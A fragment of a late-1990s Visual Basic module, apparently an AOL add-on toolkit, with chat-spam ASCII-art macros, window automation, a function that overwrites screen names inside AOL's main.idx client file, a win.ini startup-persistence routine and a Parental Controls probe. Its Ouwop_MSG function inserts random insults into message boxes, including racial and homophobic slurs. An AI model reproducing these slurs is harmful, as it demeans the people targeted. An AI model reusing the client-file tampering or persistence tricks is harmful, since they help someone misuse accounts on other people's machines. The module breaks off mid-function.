sendchat ":  (::::*:::)(:::*::::)(::::*:::)(:::*::::)(::::*:::)(:::*::::)"
sendchat ":  (:::::*::)(::*:::::)(:::::*::)(::*:::::)(:::::*::)(::*:::::)"
sendchat ":  (::::::*:)(:*::::::)(::::::*:)(:*::::::)(::::::*:)(:*::::::)"
sendchat ":  (:::::::*)(*:::::::)(:::::::*)(*:::::::)(:::::::*)(*:::::::)"
sendchat ":  (*:::::::)(:::::::*)(*:::::::)(:::::::*)(*:::::::)(:::::::*)"
sendchat ":  (:*::::::)(::::::*:)(:*::::::)(::::::*:)(:*::::::)(::::::*:)"
sendchat ":  (::*:::::)(:::::*::)(::*:::::)(:::::*::)(::*:::::)(:::::*::)"
sendchat ":  (:::*::::)(::::*:::)(:::*::::)(::::*:::)(:::*::::)(::::*:::)"
sendchat ":  (::::*:::)(:::*::::)(::::*:::)(:::*::::)(::::*:::)(:::*::::)"
sendchat ":  (:::::*::)(::*:::::)(:::::*::)(::*:::::)(:::::*::)(::*:::::)"
sendchat ":  (::::::*:)(:*::::::)(::::::*:)(:*::::::)(::::::*:)(:*::::::)"
sendchat ":  (:::::::*)(*:::::::)(:::::::*)(*:::::::)(:::::::*)(*:::::::)"
sendchat ":  (*:::::::)(:::::::*)(*:::::::)(:::::::*)(*:::::::)(:::::::*)"

End Sub

Sub OH_Timon()
'ouwop
'macr0 art by- lev_9
SendchAt3 ".                            ,-`  .--~'``>-.....,"
SendchAt3 ".                 ,....._.-`               -~``---....,"
SendchAt3 ".                  \  -`                          . -~``"
SendchAt3 ".                   /: ,--,;'''''``;-.          ,-'```\"
SendchAt3 ".                 /  ,/ ;''        ;  `-._.-`' ;'''~,.\"
SendchAt3 ".               / ,-'  / ,.-'```-,.'          /.~.    \"
SendchAt3 ".            .'~~- ''.`..-.._ /    :.     /_    ',  /"
SendchAt3 ".       .-'`  _...    ' @.. /           /@:`-.-`  \"
SendchAt3 ".  .-'::`/  .'`  _...,        \   ..---.. \````         ',"
SendchAt3 ". /::::/  /  ,-'`     '-.       `,.--~~--.\,.-'````' ,    \-."
SendchAt3 ".{::::{     ',           '-.      \          /        ,'    }::\"
SendchAt3 ".'-,::::\._  '`--.          '-.....'-......-'          ,..'::::::}"
SendchAt3 ".   ' ::::::'~~'  `- ,                 , -~~'``'``'~-.:::.-`"
SendchAt3 ".         '''''''''''''''''''\ ' ,            ,'"
SendchAt3 ".                   '\  ',         ,'    ‹›‹ › †Í/X\ÕÑ  ‹ ›‹›"
SendchAt3 ".                     \  ',        ',   †}-{è  £îòñ  |<îñg"
SendchAt3 ".                     .\.--.._     ',..-` ` ` -."
SendchAt3 ".                  /'          `-.    '` - .    :\"
SendchAt3 ".                /:               `-,       '`--.}"
SendchAt3 ".              /:                    }\         ' -.,"
SendchAt3 ".            /:                         '\           ;;`-...._"
SendchAt3 ".          /:                             \          ;;;       ` -.."
SendchAt3 ".        /'           ;```\``'``            ',          ;;..          ` -,"
SendchAt3 ".      /:           ,'     |::::....,         ',           ;;--.{         :;"
SendchAt3 ".    /'             /      |::::::``           ',           ;; /       :;;:\;"
SendchAt3 ".   {;:  ----..._/        |;                   ',          ::       `;/;|:/"
SendchAt3 ".  ;:\:;           ` -..._|::::::...,          ;           ::; .--./_ _"
SendchAt3 ".   {;;::\;;  ;            ` ` ```;            ;           :;/    /`  )   )"
SendchAt3 ".__      \;;/~-----.....-`     /            ;             :.  /   /   /"
SendchAt3 ".\::::\                  /      /:::..,       ;             ;::/   /   /"
SendchAt3 ". ',::::\ ,..._\``-,_ /       /::::``       ;               :;: /    /"
SendchAt3 ".  }:::::\;      `-.....       \             ;              :;;` `--`"
SendchAt3 ".  ',::::::|`` ` -..._   :/|    |:::..,      ;                ;::"
SendchAt3 ".   |::::::', ---``     .-' }    |::::``     ;                :;:"
SendchAt3 ".   ',       \- ....-~`   (    /           ;                 ;::"
SendchAt3 ".    ',       ',             ```}::::::.,    ;                 :::"
SendchAt3 ".     ',       '\              /::::::``     ;                 :;:"
SendchAt3 ".      ',       ',           /               ;                 :;;"
SendchAt3 ".       \:       ',        /:::::::..,       ;.                ;::"
SendchAt3 ".        ',        ;      /:::::::::```      ;.                :;;"
SendchAt3 ".         ',        ',  ,'                    ;                 ;:;"
SendchAt3 ".          ;         `/::::::::...,        ;                  ;::"
SendchAt3 ".          ',        /:::::::::::```      ,'                   :;:"
SendchAt3 ".           \;    ,'                      '                   :;;;"
SendchAt3 ".            \   /:::::::::::...,       '                    :;:;"
SendchAt3 ".              \/::::::::::::```      ,'                    :;:`'\"
SendchAt3 ".              /:                    ;                    :,'    '\"
SendchAt3 ".             '                     ;                    :;:       \"
SendchAt3 ".             ',                   ',   _......._    ::;          }"
SendchAt3 ".               '  -,             ,' `           }:               ,'"
SendchAt3 ".                     ' ,          \            /:             ,'"
SendchAt3 ".                        ' -,        \         /'            ,'"
SendchAt3 ".    ..-~:::::::,`` ` `  `          }       /            /'"
SendchAt3 ".  /::::::::::::::',            ...--`       {           '............_"
SendchAt3 ". '-::::{::::{::::::', ....--``               `-.           ,':::::::::::::.,"
SendchAt3 ".     ``````````````                            `--,     ,'::::::::}:::}::::}"
SendchAt3 ".                                                    ` ' ```````````````````"


End Sub

Function Replace_SN(strsn As String, strnewsn As String, straolpath As String)
'from izekial but edited by me [ouwop]
'to werk with vb4 and 16 char s/n'z
    Call AOL4_KillWin(FindSignOnWin)
    Let lngsnlen& = Len(strsn$)
    Select Case lngsnlen&
        Case 3&
            Let strsn$ = strsn$ & "             "
        Case 4&
            Let strsn$ = strsn$ & "            "
        Case 5&
            Let strsn$ = strsn$ & "           "
        Case 6&
            Let strsn$ = strsn$ & "          "
        Case 7&
            Let strsn$ = strsn$ & "         "
        Case 8&
            Let strsn$ = strsn$ & "        "
        Case 9&
            Let strsn$ = strsn$ & "       "
        Case 10&
            Let strsn$ = strsn$ & "      "
        Case 11&
            Let strsn$ = strsn$ & "     "
        Case 12&
            Let strsn$ = strsn$ & "    "
        Case 13&
            Let strsn$ = strsn$ & "   "
        Case 14&
            Let strsn$ = strsn$ & "  "
        Case 15&
            Let strsn$ = strsn$ & " "
        Case 16&
            Let strsn$ = strsn$
    End Select
    Let lngsnlen& = Len(strnewsn$)
    Select Case lngsnlen&
        Case 3&
            Let strnewsn$ = strnewsn$ & "             "
        Case 4&
            Let strnewsn$ = strnewsn$ & "            "
        Case 5&
            Let strnewsn$ = strnewsn$ & "           "
        Case 6&
            Let strnewsn$ = strnewsn$ & "          "
        Case 7&
            Let strnewsn$ = strnewsn$ & "         "
        Case 8&
            Let strnewsn$ = strnewsn$ & "        "
        Case 9&
            Let strnewsn$ = strnewsn$ & "       "
        Case 10&
            Let strnewsn$ = strnewsn$ & "      "
        Case 11&
            Let strnewsn$ = strnewsn$ & "     "
        Case 12&
            Let strnewsn$ = strnewsn$ & "    "
        Case 13&
            Let strnewsn$ = strnewsn$ & "   "
        Case 14&
            Let strnewsn$ = strnewsn$ & "  "
        Case 15&
            Let strnewsn$ = strnewsn$ & " "
        Case 16&
            Let strnewsn$ = strnewsn$
    End Select
    Let lngnumhold& = 1&
    If Right$(straolpath$, 1&) = "\" Then straolpath$ = Right$(straolpath$, 1&)
    Do Until 2& > 3&: DoEvents
        Let strtext$ = ""
        On Error Resume Next
        Open straolpath$ & "\idb\main.idx" For Binary As #1&
            If Err Then
                Exit Function
            Else
                Let strtext$ = String$(32000&, 0&)
                Get #1, lngnumhold&, strtext$
            End If
        Close #1&
        Open straolpath$ & "\idb\main.idx" For Binary As #2&
            Let lngthesn& = InStr(1&, strtext$, strsn$, 1&)
            If lngthesn& Then
                Mid(strtext$, lngthesn&) = strnewsn$
                Let strtoreplace$ = strnewsn$
                Put #2&, (lngnumhold& + lngthesn&) - 1&, strtoreplace$
getDATsn:
                DoEvents
                Let lngthesn2& = InStr(1&, strtext$, strsn$, 1&)
                If lngthesn2& Then
                    Mid(strtext$, lngthesn2&) = strnewsn$
                    Put #2&, (lngnumhold& + lngthesn2&) - 1&, strtoreplace$
                    GoTo getDATsn
                End If
            End If
            Let lngnumhold& = lngnumhold& + 32000&
            Let lnglenofile2& = LOF(2&)
        Close #2&
        If lngnumhold& > lnglenofile2& Then Call runaolmenubystring("&Sign On Screen"): Exit Function
    Loop
End Function
Function FindSignOnWin() As Long
     'knk
     'edited by ouwop though to werk in vb4
     lngaol& = FindWindow("AOL Frame25", vbNullString)
     lngmdi& = FindWindowEx(lngaol&, 0&, "MDIClient", vbNullString)
     FindSignOnWin& = FindWindowEx(lngmdi&, 0&, "AOL Child", "Sign On")
End Function

 Sub SocketsCleanup()
'by lash
'damn lash u muzt be a real good programmer to
'write such a long as devoted code >;]
'juz playin yo, i know u know your shit
'[ouwop]
    If WSACleanup() <> ERROR_SUCCESS Then
        MsgBox "Socket error occurred in Cleanup."
    End If
    
End Sub
 Function SocketsInitialize() As Boolean
'lash
'diz wouldve tooken me a while judgin from i dont
'do socket programmin alot, im on aol now, movin to
'socketz when done thiz bas
'[ouwop]
   Dim WSAD As WSADATA
   Dim sLoByte As String
   Dim sHiByte As String
   
   If WSAStartup(WS_VERSION_REQD, WSAD) <> ERROR_SUCCESS Then
      MsgBox "The 32-bit Windows Socket is not responding."
      SocketsInitialize = False
      Exit Function
   End If
   
   
   If WSAD.wMaxSockets < MIN_SOCKETS_REQD Then
        MsgBox "This application requires a minimum of " & _
                CStr(MIN_SOCKETS_REQD) & " supported sockets."
        
        SocketsInitialize = False
        Exit Function
   End If
   
   
   If LoByte(WSAD.wVersion) < WS_VERSION_MAJOR Or _
     (LoByte(WSAD.wVersion) = WS_VERSION_MAJOR And _
      HiByte(WSAD.wVersion) < WS_VERSION_MINOR) Then
      
      sHiByte = CStr(HiByte(WSAD.wVersion))
      sLoByte = CStr(LoByte(WSAD.wVersion))
      
      MsgBox "Sockets version " & sLoByte & "." & sHiByte & _
             " is not supported by 32-bit Windows Sockets."
      
      SocketsInitialize = False
      Exit Function
      
   End If
    SocketsInitialize = True
End Function


Sub About(ProgName$, CompanyName$, Notez$, DateStarTed$, DateENDed$)
'ouwop
'Example-_
'Call About("MazTa Progg","Ouwop Software Productionz","Thank you for blah blah","February 10 1999","< Not Finished >")
CompanyName$ = CompanyName$ + " ©"
DateStarT$ = "Started on " + DateStarTed$
DateENd$ = "Completed on " + DateENDed$
ProgName$ = """" + ProgName$ + """"
MsgBox ProgName$ + Chr(10) + Chr(10) + DateStarTed$ + Chr(10) + DateENDed$ + Chr(10) + Chr(10) + CompanyName$, 64, "About..."
End Sub



Function Get_input(sPrompt$, IB_TITLE$, Msg As Boolean)
'Ouwop Nigga
Static iXPos As Integer, iYPos As Integer
SetWinOnTop = SetWindowPos(X, HWND_BROADCAST, 0, 0, 0, 0, FLAGz)
X = sPrompt$
sPrompt$ = X
sName$ = InputBox$(sPrompt$, IB_TITLE$, , iXPos, iYPos)
If sName$ = "" Then
If Msg = True Then MsgBox "No Input Entered Fo0", vbCritical, "Error!": Get_input = "": Exit Function
Get_input = ""
Else
Get_input = sName$
End If
End Function

Public Sub makeshortcut(strshortcutdir As String, strshortcutname As String, strshortcutpath As String)
    Dim strwinshortcutdir As String, strwinshortcutname As String, strwinshortcutexepath As String, IXI As Long
    Let strwinshortcutdir$ = strshortcutdir$
    Let strwinshortcutname$ = strshortcutname$
    Let strwinshortcutexepath$ = strshortcutpath$
  On Error Resume Next
'If File_IfDirectoryExists("C:\windows\start menu\" & dir$) = False Then MkDir ("C:\windows\start menu\" & dir$)
'cR:
Let IXI& = fCreateShellLink("", strwinshortcutname$, strwinshortcutexepath$, "")

End Sub
Sub AligN(frm As Form)
'wop
frm.Left = (Screen.Width - frm.Width) \ 2
End Sub


Sub AOL_Caption_Scr0LL(ProggNaME As String)
Call AOLChangeCaption(" " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("  " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("   " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("    " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("     " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("      " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("         " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("           " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("             " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("               " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                 " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                  " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                    " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                      " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                        " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                          " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                            " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                              " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                  " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                     " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                        " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                           " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                             " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                   " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                        " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                            " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                                " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                                    " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                                       " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                                            " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                                                " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                                                    " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                                                        " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                                                            " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                                                                " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                                                                    " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                                                                         " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                                                                         " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                                                                     " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                                                                " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                                                            " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                                                         " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                                                      " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                                                    " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                                                  " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                                               " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                                            " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                                          " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                                       " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                                    " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                                 " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                             " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                          " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                       " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                   " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                                " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                             " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                          " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                       " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                   " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                                " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                           " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                      " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("                 " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("           " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("       " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("   " + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("" + ProggNaME$)
TimeOut (0.01)
Call AOLChangeCaption("America  Online")

End Sub

Sub ie_capti0nScroLL(ProggNaME As String, Continuence As Boolean)
'ouwop
again:
b4$ = ie_caption
a$ = ""
Do
Call ie_Changecaption(a$ + ProggNaME$)
a$ = a$ + " "
TimeOut (0.1)
Loop Until a$ = "                                                                     "
If Continuence = False Then
Call ie_Changecaption(b4$)
Exit Sub
Else
GoTo again
End If
End Sub




Function Color_Change(BF, wUt)
'ouwop
'example
'Call Color_Change(1,label1)'changez da objectz Forecolor
'Call Color_Change(2,label1)'changez da objectz Backcolor
'Call Color_Change(3,label1)'changez a Shapez BorderColor
Static TheColor
TheColor = TheColor + 1
TheColor = IIf(TheColor < 15, TheColor, 1)
On Error Resume Next
If BF = "1" Then wUt.ForeColor = QBColor(TheColor)
If BF = "2" Then wUt.BackColor = QBColor(TheColor)
If BF = "3" Then wUt.BorderColor = QBColor(TheColor)

End Function


Sub Macro_Doerz()
sendchat ".                                     (\;"
TimeOut (0.5)
sendchat ".                               (\;    ) )    (        ;/)     .·"
TimeOut (0.5)
sendchat ".           ) ) · (; (    );;)  (;;; ( .·´::::;::);;; )  (;; (   ;/)"
TimeOut (0.5)
sendchat ".     (    );  ) (:: (.·´ ::::`·..);;;);;;;;;;;;;;;;;;;;;;;:::ll....("
TimeOut (0.5)
sendchat ".   (             :::;;  ;DONT    ƒU¢K     WIT ;:...    ("
TimeOut (0.5)
sendchat ".    )  ....:::::;;;;;;;;;;;;;;‡··DÕE®š·‡ ;;;;;;;;;;...  )"
TimeOut (0.5)
sendchat ".      ©®i†HE¥ , JgÔn, Ôuwop, ®aYeBabe"
TimeOut (0.5)
sendchat ".    ,ßam4152,Štep2dady.BigDÁwg ¶haaaaQ,"
TimeOut (0.5)
sendchat ".    BkÂ Paul, X†chead, DiƒucerD, Vi®ucide1"
TimeOut (0.5)
sendchat ".         Hel©om69 , ©Field4610, ©kG848"
TimeOut (0.5)
sendchat ".        Eyen†h§ki,ª©idßr/\/00³,\/ßlÀÏ®420"
TimeOut (0.5)
sendchat ".          {S FT5"
TimeOut (0.5)
sendchat ".                        (  Õ®    ¥øU ' ÍÍ   GÈ† )"
TimeOut (0.5)
sendchat ".                          (     š†®@ïgH†       )"
TimeOut (0.5)
sendchat ".                            (   ƒú©kÈ   Ùþ»)"
TimeOut (0.5)
sendchat ".            >Ôu\\'op<     {S FT1"
TimeOut (0.5)
sendchat ".                 ¿    ¿    ±  ¥      ¢      ¿     ¿"
TimeOut (0.5)
sendchat ".                                {S FT2"
TimeOut (0.5)
sendchat ".         _______::_____:___________::::______"
TimeOut (0.5)
sendchat ".         \::::_::::::\/::::::::\|::::___||::__:::\:/:::____:|"
TimeOut (0.5)
sendchat ".         \:::|::\::::::|::::|::::||:::|___:|::|_\::::||:::|___"
TimeOut (0.5)
sendchat ".         /:::|:::|:::::|::::|::::||:::___|:|:::::::_:/|____:::\"
TimeOut (0.5)
sendchat ".         |:::|_:/:::::|::::|::::||:::|___:|:::|\::\:_____|::::|"
TimeOut (0.5)
sendchat ".         \_______/\____/:|_____||__|:|_||_______/::"
TimeOut (0.5)
sendchat ".       :::::«-v^vÔuWÔ¶:×:Oƒ::ÐÔE®Zv^v-» [1994]"
TimeOut (0.5)
End Sub

Sub Macro_IXI2()
'thanx to plasid for diz macro
sendchat " |˜¨¯¨˜'|'‚  \˜¨¯¨˜'\      /˜¨¯¨˜'/'   |˜¨¯¨˜'|'‚"
TimeOut (0.5)
sendchat " |      '|    '\      '\   /      /     |      '|"
TimeOut (0.5)
sendchat " |      '|      \¸_¸_¸\/¸_¸_¸/      |      '|"
TimeOut (0.5)
sendchat " |      '|      /˜¨¯¨˜'/\˜¨¯¨˜'\  '    |      '|"
TimeOut (0.5)
sendchat " |      '|    /       /  \      '\'     |      '|"
TimeOut (0.5)
sendchat " |¸_¸_¸|   /¸_¸_¸/ /\ '\¸_¸_¸\'    |¸_¸_¸|"
TimeOut (0.5)
sendchat " |˜¨¯¨˜'|°  |˜¨¯¨˜| '/  '\ '|˜¨¯¨˜|    |˜¨¯¨˜'|°"
TimeOut (0.5)
sendchat " |¸_¸_¸|   |¸_¸_'|/     \|¸_¸_'|     |¸_¸_¸|"
TimeOut (0.5)
sendchat " ¯\(¯'     ¯\(¯         ¯)/¯        ¯\(¯'    I3y PlaSiD"
TimeOut (0.5)

End Sub

Sub Macro_Yo()
sendchat "        ,'¯¯¯¯',"
TimeOut (0.5)
sendchat "         '.___.'"
TimeOut (0.5)
sendchat "        ;_____;"
TimeOut (0.5)
sendchat "    ,----[ ^ ^ ]---,"
TimeOut (0.5)
sendchat "   ;      ¯¯¯     ' ;"
TimeOut (0.5)
sendchat "   \,  /         \  ,'/"
TimeOut (0.5)
sendchat "    \ /           \ /"
TimeOut (0.5)
sendchat "     /   ~IXI~   \'"
TimeOut (0.5)
sendchat "    (_________)  ¬Ouwop"
TimeOut (0.5)
sendchat "   ,--)     |_    (--,.  ¬99- 00"
TimeOut (0.5)
sendchat "  \¯              ¯,/    ¬ IXI ~"
TimeOut (0.5)
sendchat "   \,       |_     ,/"
TimeOut (0.5)
sendchat "   _\_   _|   _  /"
TimeOut (0.5)
sendchat "   `\___  |__  '/"
TimeOut (0.5)
sendchat "     `\___|___/'"
TimeOut (0.5)
sendchat "  __/=/¯/ \¯\=\__"
TimeOut (0.5)
sendchat "(' \\\¯\  ; )(;  /¯/// ')"
TimeOut (0.5)
sendchat " '¯¯¯¯¯¯   ¯¯¯¯¯'"
TimeOut (0.5)

End Sub

Sub MazTa_KW(loc As String)
'ouwopztuh
If IsUserOnline Then
If AOL_VerzioN = 2 Then Call AOL25_keyword(loc$)
If AOL_VerzioN = 4 Then Call XAOL4_Keyword(loc$)
If AOL_VerzioN = 5 Then Call XAOL4_Keyword(loc$)
ElseIf ie_mdi = 1 Then
Call ie_goURL(loc$)
Else
MsgBox "There iz no way to goto " + loc$ + Chr(13) + "pleaze sign on AOL or open your browser 'ie'", 64, "err0r!"
End If
End Sub

Function MazTa_SendIM(zz$, GG$)
'ouwop

If AOL_VerzioN = 2 Then
Call AOL25_sendim(zz$, GG$)
Else
Call sendim(zz$, GG$)
End If

End Function

Sub MazTa_SendMail(ah$, bh$, ch$)
'ouwop
'mazta send email example =- Call MazTa_sendMail(who,subject,mezzaGe)

If AOL_VerzioN = 2 Then
Call AOL25_Compoze(ah$, bh$, Remove_HTML(ch$))
Else
Call senDmail(ah$, bh$, ch$)
End If

End Sub

Function Ouwop_MSG()
  'ouwop
  'add diz to your msgbox'z
  'example=-
  'msgbox "Not Online" + ouwop_msg
  'msgbox "Not in ChatRo0m" + ouwop_msg
  'MsgBox "Not Online" + Ouwop_MSG, 64, "Error!"
  'ext....
    Dim OLD
    Randomize
    OLD = Int(17 * Rnd + 1)
If OLD = 1 Then Ouwop_MSG = " fo0!"
If OLD = 2 Then Ouwop_MSG = " nigga!"
If OLD = 3 Then Ouwop_MSG = " ChumP!"
If OLD = 4 Then Ouwop_MSG = " white boy!"
If OLD = 5 Then Ouwop_MSG = " Fag!"
If OLD = 6 Then Ouwop_MSG = " asshole!"
If OLD = 7 Then Ouwop_MSG = " dickface!"
If OLD = 8 Then Ouwop_MSG = " FatAzz~"
If OLD = 9 Then Ouwop_MSG = " hoe!"
If OLD = 10 Then Ouwop_MSG = " Ya Freak!"
If OLD = 11 Then Ouwop_MSG = " Locztuh Corn Eatin Beatch!"
If OLD = 12 Then Ouwop_MSG = " Redneckztuh!"
If OLD = 13 Then Ouwop_MSG = " beotch!"
If OLD = 14 Then Ouwop_MSG = " bum!"
If OLD = 15 Then Ouwop_MSG = " dick!"
If OLD = 16 Then Ouwop_MSG = " nuttsack!"
If OLD = 17 Then Ouwop_MSG = " ToeCheeze!"
End Function

Public Sub Startup_ON()
 Call INI_WriTe2("windows", "Load", App.Path & "\" & App.EXEName + ".exe", "C:\windows\win.ini")
End Sub
Public Sub Startup_OFF()
 Call INI_WriTe2("windows", "Load", "", "C:\windows\win.ini")
End Sub


Function CchAt_wWw(url$)
Call RePlacestRing(url$, "http://", "")
Call RePlacestRing(url$, "www.", "")
If InStr(LCase(url$), LCase(".com")) Then Site$ = "http://www." + url$ Else Site$ = "http://www." + url$ + ".com"
Call XAOL4_Keyword(Site$)
CchAt_wWw = Site$
End Function

Sub NotOnTop(the As Form)
SetWinOnTop = SetWindowPos(the.hwnd, HWND_NOTOPMOST, 0, 0, 0, 0, FLAGS)
End Sub
Sub AOL25_SetupTCPip()
'ouwop
If AOL25_FindSignOnScreeN <> 0 Then
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
chil% = FindChildByClass(MDI%, "AOL Child")
Combo% = FindChildByClass(chil%, "_AOL_Combobox")
lis% = FindChildByClass(chil%, "_AOL_Listbox")
gly% = FindChildByClass(chil%, "_AOL_Glyph")
icona% = FindChildByClass(chil%, "_AOL_Icon")
Rich% = FindChildByClass(chil%, "RICHCNTL")
stat% = FindChildByClass(chil%, "_AOL_Static")
entry% = FindChildByClass(chil%, "_AOL_edit")
   stat2% = GetWindow(stat%, GW_HWNDNEXT)
        stat3% = GetWindow(stat2%, GW_HWNDNEXT)
            stat4% = GetWindow(stat3%, GW_HWNDNEXT)
setup% = GetWindow(icona%, GW_HWNDNEXT)
Call cLickiCoN(setup%)
Do
w% = FindWindow("_AOL_Modal", vbNullString)
Loop Until gettext(w%) = "Network & Modem Setup"
icona% = FindChildByClass(w%, "_AOL_button")
Clicker (icona%)
Do
DoEvents:
w% = FindWindow("_AOL_Modal", vbNullString)
Loop Until gettext(w%) = "Network Setup"
comb& = FindChildByClass(w%, "_AOL_ComboBox")
  comb& = GetWindow(comb&, GW_HWNDNEXT)
      comb& = GetWindow(comb&, GW_HWNDNEXT)
    
    Call PostMessage(comb&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(comb&, WM_LBUTTONUP, 0&, 0&)
    Call PostMessage(comb&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(comb&, WM_LBUTTONUP, 0&, 0&)
    TimeOut (0.001)
    Call SendMessageLong(comb&, CB_SETCURSEL, ComboCount(comb&) - 2, 0&)
TimeOut (0.1)
w% = FindWindow("_AOL_Modal", vbNullString)
but% = FindChildByClass(w%, "_AOL_Button")
but% = GetWindow(but%, GW_HWNDNEXT)
but% = GetWindow(but%, GW_HWNDNEXT)
but% = GetWindow(but%, GW_HWNDNEXT)
but% = GetWindow(but%, GW_HWNDNEXT)
but% = GetWindow(but%, GW_HWNDNEXT)
but% = GetWindow(but%, GW_HWNDNEXT)
but% = GetWindow(but%, GW_HWNDNEXT)
but% = GetWindow(but%, GW_HWNDNEXT)
but% = GetWindow(but%, GW_HWNDNEXT)
but% = GetWindow(but%, GW_HWNDNEXT)
but% = GetWindow(but%, GW_HWNDNEXT)
but% = GetWindow(but%, GW_HWNDNEXT)
but% = GetWindow(but%, GW_HWNDNEXT)
but% = GetWindow(but%, GW_HWNDNEXT)
but% = GetWindow(but%, GW_HWNDNEXT)
but% = GetWindow(but%, GW_HWNDNEXT)
but% = GetWindow(but%, GW_HWNDNEXT)
but% = GetWindow(but%, GW_HWNDNEXT)
Clicker (but%)
w% = FindWindow("_AOL_Modal", vbNullString)
but% = FindChildByClass(w%, "_AOL_Button")
but% = GetWindow(but%, GW_HWNDNEXT)
but% = GetWindow(but%, GW_HWNDNEXT)
but% = GetWindow(but%, GW_HWNDNEXT)
but% = GetWindow(but%, GW_HWNDNEXT)
but% = GetWindow(but%, GW_HWNDNEXT)
Clicker (but%)

Else
MsgBox "Muzt be on Sign on screen AOL 2.5", vbCritical, "ERROR!"
End If
End Sub

Public Sub ClearHistory()
    'Dim AolFrame As Long, AolToolbar As Long, Toolbar As Long
    'Dim ComboBox As Long, Edit As Long
    AolFrame% = FindWindow("AOL Frame25", vbNullString)
    AolToolbar% = FindWindowEx(AolFrame%, 0&, "AOL Toolbar", vbNullString)
    Toolbar% = FindWindowEx(AolToolbar%, 0&, "_AOL_Toolbar", vbNullString)
    ComboBox% = FindWindowEx(Toolbar%, 0&, "_AOL_Combobox", vbNullString)
    edit% = FindWindowEx(ComboBox%, 0&, "Edit", vbNullString)
'
    Call SendMessageLong(ComboBox%, CB_RESETCONTENT, 0&, 0&)
    Call SendMessageByString(edit%, WM_SETTEXT, 0&, "Type Keyword or Web Address here and click Go")
End Sub


 Function izMaZter()
'ouwop
  lngaol% = FindWindow("AOL Frame25", vbNullString)
  lngmdi% = FindWindowEx(lngaol%, 0&, "MDICLIENT", vbNullString)
  Call XAOL4_Keyword("aol://4344:1580.prntcon.12263709.564517913")
  Do
  TimeOut (0.2)
  lngprntwindow% = FindWindowEx(lngmdi%, 0&, "AOL Child", " Parental Controls")
